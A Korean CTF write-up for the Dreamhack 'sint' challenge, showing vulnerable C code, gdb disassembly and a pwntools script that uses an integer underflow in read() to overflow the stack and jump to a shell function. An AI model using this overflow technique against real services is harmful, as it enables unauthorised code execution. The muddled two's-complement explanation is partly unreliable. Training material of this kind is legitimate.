---
published: true
image: /img
layout: post
title: Dreamhack sint 문제풀이
tags: [Dreamhack, pwnable, ctf, writeup]
math: true
date: 2022-05-03 21:00
---
오랜만에 풀어보는 pwn문제이다.

드림핵에 베이직으로 있는 sint의 취약점을 이용한 문제로 문제이름 또한 sint이다.

문제 압축파일을 다운 받으면 .c로 된 코드 파일과 컴파일한 elf 파일을 제공한다. 우선 .c 파일을 열어보면 내용은 다음과 같다.

```c++
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void get_shell()
{
    system("/bin/sh");
}

int main()
{
    char buf[256];
    int size;

    initialize();

    signal(SIGSEGV, get_shell);

    printf("Size: ");
    scanf("%d", &size);

    if (size > 256 || size < 0)
    {
        printf("Buffer Overflow!\n");
        exit(0);
    }

    printf("Data: ");
    read(0, buf, size - 1);

    return 0;
}
```

위 코드를 살펴보면 Size를 입력 받고 if 구분을 통해 조건 비교 후 Data를 read 함수로 입력받는 구조이다. if문을 보면 256보다 크거나, 0보다 작으면 `printf("Buffer Overflow!\n");`를 실행하고 코드를 종료한다. 따라서 Size에 입력되는 값은 0~256까지의 범위를 가질 수 있다.

아래 read함수를 보면 사이즈가 256인 buf 변수에 `size-1`만큼의 데이터를 입력 받는다. 여기서 잘 봐야할 점은 size는 0부터 256까지 숫자가 들어갈 수 있는데 만약 0을 넣으면 어떤일이 일어날까?

read의 데이터 크기에는 -1이 들어가고 이는 2진 보수변환에 의해 아에 다른 값으로 바뀐다.
int형은 4byte가지고 있다. 기본적으로 C언어의 숫자처리는 마이너스 값을 취급하기위해 2의 보수를 사용하며 양의 정수값만 사용하는 int를 선언하려면 Unsigned int 자료형을 사용해야한다.

4바이트 크기의 1을 2진으로 변환하면 다음과 같다. 
```
0000 0000 0000 0000 0000 0000 0000 0001
```
하지만 이를 컴퓨터가 양수 1로 인식하기 위해서는 1의 보수를 구한 다음 2의 보수를 구해 계산한다

그 과정은 다음과 같다.

```
0000 0000 0000 0000 0000 0000 0000 0001

위 2진수를 1의 보수처리를 한다(2진수의 NOT = 의 보수)

1111 1111 1111 1111 1111 1111 1111 1110

위 2진수를 2의 보수처리 한다.(1의 보수의 2진 값 + 1)

1111 1111 1111 1111 1111 1111 1111 1111
```

위 설명이 2의 보수처리에 관한 설명이다. 이걸 응용해 -1의 보수를 구하면 
```
0000 0000 0000 0000 0000 0000 0000 0001
```
다음과 같지만 read 함수의 데이터 크기를 양수만, 즉 Unsigned int값을 받는다.
즉 따라서 보수 처리가 필요 없다는 것인데, 위 -1의 보수처리된 2진수를 역으로 계산하면 
```
1111 1111 1111 1111 1111 1111 1111 1111
```
위 2진수가 메모리에 저장되어 있는것이다. 이 값는 0xffffffff와 동일하며 매우 큰 값을 뜻하므로 버퍼 오버플로우 공격이 가능하다.

자세한 내용은 C언어의 메모리 저장과 보수처리에 관해서 찾아보면 금방 이해 될 것이다.


위와같이 -1이 들어가면 매우 큰 값을 쓸 수 있으니, size에는 0을 넣으면 된다. 이후 read함수에서 버퍼오버플로우를 이용해 return값을 조작해 문제를 풀면 된다.

우선 바이너리를 gdb를 통해 disas main을 진행한다.
```c++
   0x0804866c <+0>:	    push   ebp
   0x0804866d <+1>: 	mov    ebp,esp
   0x0804866f <+3>:	    sub    esp,0x104
   0x08048675 <+9>:     call   0x8048612 <initialize>
   0x0804867a <+14>:	push   0x8048659
   0x0804867f <+19>:	push   0xb
   0x08048681 <+21>:	call   0x8048470 <signal@plt>
   0x08048686 <+26>:	add    esp,0x8
   0x08048689 <+29>:	push   0x80487a1
   0x0804868e <+34>:	call   0x8048460 <printf@plt>
   0x08048693 <+39>:	add    esp,0x4
   0x08048696 <+42>:	lea    eax,[ebp-0x104]
   0x0804869c <+48>:	push   eax
   0x0804869d <+49>:	push   0x80487a8
   0x080486a2 <+54>:	call   0x80484e0 <__isoc99_scanf@plt>
   0x080486a7 <+59>:	add    esp,0x8
   0x080486aa <+62>:	mov    eax,DWORD PTR [ebp-0x104]
   0x080486b0 <+68>:	cmp    eax,0x100
   0x080486b5 <+73>:	jg     0x80486c1 <main+85>
   0x080486b7 <+75>:	mov    eax,DWORD PTR [ebp-0x104]
   0x080486bd <+81>:	test   eax,eax
   0x080486bf <+83>:	jns    0x80486d5 <main+105>
   0x080486c1 <+85>:	push   0x80487ab
   0x080486c6 <+90>:	call   0x8048490 <puts@plt>
   0x080486cb <+95>:	add    esp,0x4
   0x080486ce <+98>:	push   0x0
   0x080486d0 <+100>:	call   0x80484b0 <exit@plt>
   0x080486d5 <+105>:	push   0x80487bc
   0x080486da <+110>:	call   0x8048460 <printf@plt>
   0x080486df <+115>:	add    esp,0x4
   0x080486e2 <+118>:	mov    eax,DWORD PTR [ebp-0x104]
   0x080486e8 <+124>:	sub    eax,0x1
   0x080486eb <+127>:	push   eax
   0x080486ec <+128>:	lea    eax,[ebp-0x100]
   0x080486f2 <+134>:	push   eax
   0x080486f3 <+135>:	push   0x0
   0x080486f5 <+137>:	call   0x8048450 <read@plt>
   0x080486fa <+142>:	add    esp,0xc
   0x080486fd <+145>:	mov    eax,0x0
   0x08048702 <+150>:	leave  
   0x08048703 <+151>:	ret    
```

0x0804866f 부분을 보면 esp에서 0x104만큼의 크기를 빼 buf를 위한 공간을 만든다. read함수에서 return 주소를 조작할 것이기 때문에 104를 10진수로 전환한 260의 임의 값을 넣고 4바이트의 sfp 임의 값에 get_shell()함수의 주소를 넣으면 된다.

```
disas get_shell
```
을 통해 주소값을 알아낸다. 함수의 주소는 0x08048659 이며 이를 이용해 파이썬 코드를 작성한다.

```python
from pwn import *

conn = remote("host1.dreamhack.games", 11225);

get_shell = p32(0x08048659)
payload = b'A'*(264)
payload += get_shell

conn.recvuntil("Size: ")
conn.sendline("0")

sleep(1)

conn.recvuntil("Data: ")
conn.send(payload)

sleep(1)
#conn.recvall()
conn.interactive()
```

이 코드를 돌리면 flag를 얻을 수 있다.
참고로 이유는 모르겠지만 위 코드가 윈도우 환경에서는 이상하게 동작하지 않는다. 필자는 VM을 통해 우분투 20.04를 이용했다.